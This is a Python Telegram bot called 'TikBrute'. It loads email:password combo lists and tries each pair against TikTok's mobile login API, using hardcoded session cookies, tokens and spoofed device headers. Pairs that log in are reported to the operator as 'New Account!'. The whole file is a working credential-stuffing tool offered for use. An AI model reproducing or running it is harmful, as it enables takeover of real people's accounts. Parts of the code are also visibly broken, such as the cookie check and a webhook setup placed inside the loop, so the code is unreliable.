import requests,user_agent,json,flask,telebot,random,os,sys
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from flask import Flask, request
from telebot import types 
bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)


token = input("[~] Enter Token :")
bot = telebot.TeleBot(token)
p1 = types.InlineKeyboardButton(text ="- Run",callback_data = 'n3')
@bot.message_handler(commands=["start"])
def start(message):
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 1
    maac.add(p1)
    bot.send_message(message.chat.id,f"<strong>Hi {message.from_user.first_name},\n=== === ===\nWellcome To TikBrute Bot! \nClick run To Run Bot! \n=== === ===\nBy : @trprogram </strong>",parse_mode="html",reply_markup=maac)
@bot.callback_query_handler(func=lambda call: True)
def Abdullah(call):
    if call.data == "n3":
        h2(call.message)
def h2(message):
    bot.send_message(message.chat.id,f"<strong>Ok Sir Started Now.</strong>",parse_mode="html")
    h = 0
    k = 0
    List= open("combo.txt","r")
    for i in List:
        email = i.split(':')[0]
        pas = i.split(':')[1]
        url = "https://api16-normal-c-alisg.tiktokv.com/passport/user/login/?residence=SA&device_id=6950824532194231810&os_version=14.2&app_id=1233&iid=6977891787738646273&app_name=musical_ly&vendor_id=36FD6945-5D8A-419C-994F-DA5554F11B75&locale=ar&ac=WIFI&sys_region=SA&js_sdk_version=1.77.0.2&ssmix=a&version_code=17.8.0&vid=36FD6945-5D8A-419C-994F-DA5554F11B75&channel=App%20Store&op_region=SA&tma_jssdk_version=1.77.0.2&os_api=18&idfa=988C8F15-1219-4FC2-8E4A-240107968974&install_id=6977891787738646273&idfv=36FD6945-5D8A-419C-994F-DA5554F11B75&device_platform=iphone&device_type=iPhone13%2C2&carrier_region1=SA&tz_name=Asia%2FRiyadh&account_region=&build_number=178023&tz_offset=10800&app_language=ar&carrier_region=SA&current_region=SA&aid=1233&mcc_mnc=42004&screen_width=1125&uoo=0&content_language=&language=ar&cdid=B7AF6C81-822F-426A-A191-29452813F038&openudid=fcc5f6f56d0c3faf723b836a2b21999013229b2e&app_version=17.8.0&resolution=1125%2A2436"
        
        headers = {
        "X-Tt-Token": "0109469a44ea07d35188a045e21b7e2bc201dc5e0a83240931b73e175a4c8748b834a6f9cbf8b931e860098f9884f16d2bbf206330979aa662c8a65c21150ae296093956959b8e62d48237b4f0ccf9d166fc0-1.0.0",
        'User-Agent': 'Connectionzucom.zhiliaoapp.musically/2018073102 (Linux; U; Android 9; en_AS; SM-G955F; Build/PPR1.180610.011; Cronet/58.0.2991.0)z', 
        "Accept": "application/json", 
        "Sdk-Version": "1",
        "X-Khronos": "1624668749",
        "X-Gorgon": "8402207660005b24eed05b5e1ef3f40af284bdac07ab280ddac1",
        "Host": "api16-normal-c-alisg.tiktokv.com",
        "cookie": "tt_webid=7c45d206851c3d3addad09cbae75dbbe; passport_csrf_token=a5eb71c9566c6565a2029f3b87130e82; passport_csrf_token_default=a5eb71c9566c6565a2029f3b87130e82; d_ticket=34f4d6c26a11498ba3ea420ea35e0b8e3215b; install_id=6977891787738646273; ttreq=1$3535b611b7ee3c870501dd0123efb149e6d77d54; odin_tt=851c7a44505f19d0c5470db7d85945d04c460dccc94729152a15aa9f728b2a6e1711f050f06f2a1ad4666713133b307bb6e52d34f357323e4f5c09f58f523ff76dddeb3632b36dc237fe889cd05bb809; sid_guard=b01606c18855f63650c33c44f4b41add%7C1624668344%7C5184000%7CWed%2C+25-Aug-2021+00%3A45%3A44+GMT; uid_tt=1524e3623e5d63bb7cf0faa5aa41e3dee15ca8fbb067e6339ae5b58749920a39; uid_tt_ss=1524e3623e5d63bb7cf0faa5aa41e3dee15ca8fbb067e6339ae5b58749920a39; sid_tt=b01606c18855f63650c33c44f4b41add; sessionid=b01606c18855f63650c33c44f4b41add; sessionid_ss=b01606c18855f63650c33c44f4b41add; store-idc=alisg; store-country-code=sa; multi_sids=6871097449730130950%3Ae80a06141a6c70aa40ee3743ef1d07d6%7C6915004393377793026%3Ab01606c18855f63650c33c44f4b41add"
        }
        payload = f"mix_mode=1&multi_login=1&password={pas}&username={email}"
        response = requests.post(url, data=payload, headers=headers)
        if ['sessionid'] in response.cookies:
            h+=1
            bot.send_message(message.chat.id,f"<strong>New Account!\nEmail : {email}\nPassword : {pas}\nBy : @trprogram</strong>",parse_mode="html")
        else:
            k+=1
            
            mees = types.InlineKeyboardMarkup(row_width=1)
            trakos = types.InlineKeyboardButton(f"✖️ Error : {k}",callback_data='jhi')
            buut5 = types.InlineKeyboardButton(f"➡️ At : {email}:{pas}",callback_data='jhi5')
            buut1 = types.InlineKeyboardButton(f"✅ Done : {h}",callback_data='jhi1')
        
            mees.add(trakos,buut1,buut5)
            bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="<strong>Bot Started ✅</strong>",parse_mode='html',reply_markup=mees)
        if __name__ == "__main__":
            bot.remove_webhook()
            bot.set_webhook(url="https://coinsinstabot.herokuapp.com/"+str(BOT_TOKEN))
            server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))

